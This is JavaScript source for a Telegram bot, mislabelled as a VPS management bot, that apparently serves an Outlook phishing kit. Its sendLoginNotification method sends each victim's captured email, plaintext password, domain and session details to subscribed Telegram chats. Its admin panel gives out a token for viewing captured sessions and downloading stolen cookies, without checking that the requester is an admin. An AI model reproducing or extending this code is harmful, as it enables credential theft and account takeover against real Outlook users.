const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

class VPSManagementBot {
    constructor() {
        this.token = process.env.TELEGRAM_BOT_TOKEN;
        this.bot = new TelegramBot(this.token, { polling: true });
        this.chatIds = new Set(); // Store user chat IDs for notifications
        this.rateLimits = new Map(); // Rate limiting per chat ID
        this.subscriptionsFile = path.join(__dirname, 'telegram_subscriptions.json');
        
        
        
        // Admin chat IDs for secure operations (CRITICAL SECURITY)
        this.adminChatIds = new Set((process.env.ADMIN_CHAT_IDS || '').split(',').filter(id => id.trim()));
        
        // Load persistent subscriptions
        this.loadSubscriptions();
        
        this.setupCommands();
        this.setupEventHandlers();
        console.log('🚀 VPS Management Bot initialized successfully');
    }

    // Load persistent subscriptions from file
    loadSubscriptions() {
        try {
            if (fs.existsSync(this.subscriptionsFile)) {
                const data = fs.readFileSync(this.subscriptionsFile, 'utf8');
                const subscriptions = JSON.parse(data);
                this.chatIds = new Set(subscriptions.chatIds || []);
                console.log(`📋 Loaded ${this.chatIds.size} subscription(s) from persistent storage`);
            }
        } catch (error) {
            console.error('Error loading subscriptions:', error.message);
            this.chatIds = new Set();
        }
    }

    // Save subscriptions to file
    saveSubscriptions() {
        try {
            const data = {
                chatIds: Array.from(this.chatIds),
                lastUpdated: new Date().toISOString()
            };
            fs.writeFileSync(this.subscriptionsFile, JSON.stringify(data, null, 2));
        } catch (error) {
            console.error('Error saving subscriptions:', error.message);
        }
    }

    // Rate limiting check
    checkRateLimit(chatId, command) {
        const now = Date.now();
        const key = `${chatId}_${command}`;
        const lastCall = this.rateLimits.get(key) || 0;
        
        // Allow 1 command per 2 seconds per user
        if (now - lastCall < 2000) {
            return false;
        }
        
        this.rateLimits.set(key, now);
        
        // Clean up old entries every 100 requests
        if (this.rateLimits.size > 100) {
            for (const [k, time] of this.rateLimits.entries()) {
                if (now - time > 60000) { // Remove entries older than 1 minute
                    this.rateLimits.delete(k);
                }
            }
        }
        
        return true;
    }

    setupCommands() {
        // Welcome message with main VPS management menu
        this.bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'start')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before sending another command.');
                return;
            }
            
            this.chatIds.add(chatId);
            this.saveSubscriptions();
            
            this.sendMainMenu(chatId);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'help')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before requesting help again.');
                return;
            }
            
            this.sendHelpMessage(chatId);
        });

        // Menu command to return to main menu
        this.bot.onText(/\/menu/, (msg) => {
            const chatId = msg.chat.id;
            this.sendMainMenu(chatId);
        });
    }

    sendMainMenu(chatId) {
        const welcomeMessage = `
🚀 **Welcome to Outlook Automation Bot!**

Choose an option from the menu below:

🔧 **Admin Features:**
• Admin Panel - Access admin token and management URL

❓ **Help:**
• Help - Get information about available commands and features
        `;

        const keyboard = {
            inline_keyboard: [
                [
                    { text: '🔧 Admin Panel', callback_data: 'admin_panel' }
                ],
                [
                    { text: '❓ Help', callback_data: 'help' }
                ]
            ]
        };

        this.bot.sendMessage(chatId, welcomeMessage, { 
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    }

    sendHelpMessage(chatId) {
        const helpMessage = `
❓ **Outlook Automation Bot Help**

**Available Features:**

🔧 **Admin Features**
• **Admin Panel**: Access admin token and management interface
  - View captured login sessions
  - Download session cookies and data
  - Monitor system analytics
  - Configure system settings

**Commands:**
• **/start** - Show main menu
• **/help** - Show this help message  
• **/menu** - Return to main menu

**Need Help?**
This bot provides admin access for the Outlook automation project.
        `;

        this.bot.sendMessage(chatId, helpMessage, { 
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: '🔙 Back to Menu', callback_data: 'main_menu' }
                ]]
            }
        });
    }

    setupEventHandlers() {
        // Handle callback queries (inline buttons)
        this.bot.on('callback_query', (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            
            if (!this.checkRateLimit(chatId, 'callback')) {
                this.bot.answerCallbackQuery(query.id, { text: 'Please wait before clicking again.' });
                return;
            }
            
            this.handleCallbackQuery(chatId, messageId, query);
        });

        // Handle text messages for various flows
        this.bot.on('message', (msg) => {
            const chatId = msg.chat.id;
            const text = msg.text;

            // Skip commands
            if (text?.startsWith('/')) return;
        });

        // Error handling
        this.bot.on('error', (error) => {
            console.error(`Telegram Bot error: ${error.code} - ${error.message}`);
        });

        this.bot.on('polling_error', (error) => {
            console.error(`Telegram Bot polling error: ${error.code} - ${error.message}`);
        });
    }

    async handleCallbackQuery(chatId, messageId, query) {
        const data = query.data;
        
        switch (data) {
            case 'main_menu':
                this.sendMainMenu(chatId);
                break;
                
            case 'admin_panel':
                await this.handleAdminPanel(chatId, messageId);
                break;
                
            case 'help':
                this.sendHelpMessage(chatId);
                break;
        }
        
        this.bot.answerCallbackQuery(query.id);
    }

    // Check if user has admin access for sensitive operations (DEFAULT DENY)
    isAdmin(chatId) {
        // SECURITY: Default deny - admin access must be explicitly granted
        if (this.adminChatIds.size === 0) {
            return false; // No admins configured = no access allowed
        }
        return this.adminChatIds.has(chatId.toString());
    }


    async handleAdminPanel(chatId, messageId) {
        const adminToken = global.adminToken || 'Token not available';
        const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
        
        const tokenMessage = `
🔧 <b>Admin Panel Access</b>

🔑 <b>Your Admin Token:</b>
<code>${adminToken}</code>

🌐 <b>Admin Panel URL:</b>
${adminUrl}

<b>How to use:</b>
1. Copy the token above
2. Click "Open Admin Panel" below
3. Enter the token to authenticate
4. Access all admin features and session data

<b>Features Available:</b>
• View all captured login sessions
• Download session cookies and data
• Monitor system analytics
• Configure Cloudflare settings
• Manage redirect destinations

🔒 <b>Security Note:</b> This token provides full administrative access. Keep it secure and don't share it.
        `;

        this.bot.editMessageText(tokenMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🌐 Open Admin Panel', url: adminUrl }],
                    [{ text: '🔄 Refresh Token', callback_data: 'admin_panel' }],
                    [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                ]
            }
        });
    }

    // Method to send login notifications (keep existing functionality)
    async sendLoginNotification(loginData) {
        if (this.chatIds.size === 0) {
            console.log('No Telegram users subscribed to notifications');
            return;
        }

        const { email, domain, timestamp, totalCookies, sessionId, password } = loginData;
        const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
        
        const notificationMessage = `
🔐 <b>New Outlook Login Captured!</b>

📧 <b>Email:</b> <code>${email}</code>
🔑 <b>Password:</b> <span class="tg-spoiler">${password || 'Not captured'}</span>
🏢 <b>Domain:</b> <code>${domain}</code>
🕐 <b>Time:</b> ${new Date(timestamp).toLocaleString()}
📊 <b>Cookies:</b> ${totalCookies} saved
🆔 <b>Session:</b> ${sessionId}

🌐 Access admin panel to view details and download cookies
        `;

        // Send notification to all subscribed users
        for (const chatId of this.chatIds) {
            try {
                await this.bot.sendMessage(chatId, notificationMessage, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🌐 Open Admin Panel', url: adminUrl }],
                            [{ text: '🔧 Main Menu', callback_data: 'main_menu' }]
                        ]
                    }
                });
            } catch (error) {
                console.error(`Failed to send notification to ${chatId}:`, error.message);
                // Remove invalid chat IDs
                if (error.code === 403) {
                    this.chatIds.delete(chatId);
                    this.saveSubscriptions();
                }
            }
        }
        
        console.log(`📤 Login notification sent to ${this.chatIds.size} Telegram users`);
    }

    getSubscribedUsers() {
        return this.chatIds.size;
    }
}

module.exports = VPSManagementBot;